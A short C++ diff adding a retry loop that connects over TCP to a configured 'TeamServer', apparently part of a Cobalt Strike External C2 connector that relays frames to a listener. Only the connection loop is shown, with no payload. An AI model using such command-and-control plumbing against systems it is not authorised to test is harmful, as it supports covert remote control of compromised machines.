@@ -25,6 +25,37 @@
 //	return size;
 //}
 
+//
+void waitForTsToComeOnline() {
+	WSADATA wsa;
+	WSAStartup(MAKEWORD(2, 2), &wsa);
+
+	SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
+
+	sockaddr_in addr = {};
+	addr.sin_family = AF_INET;
+	addr.sin_port = htons(TeamServer::port);
+	addr.sin_addr.s_addr = inet_addr(TeamServer::address.c_str());
+
+	// Try to connect
+	while (TRUE) {
+		int result = connect(sock, (sockaddr*)&addr, sizeof(addr));
+		if (result == 0) {
+			std::cout << "[+] TS Online, Connected to External CS Listener" << std::endl;
+			return;
+		}
+		else {
+			std::cout << "[!] TS Offline, Could not connect to External CS Listener" << std::endl;
+		}
+
+		//sleep for X time waiting for TS to come online
+		Sleep(50000);
+	}
+
+	closesocket(sock);
+	WSACleanup();
+}
+
 //converetd to vector 
 std::vector<uint8_t> recv_frame(SOCKET my_socket) {
 	std::cout << "[TS] Reciving frame from TS" << std::endl;
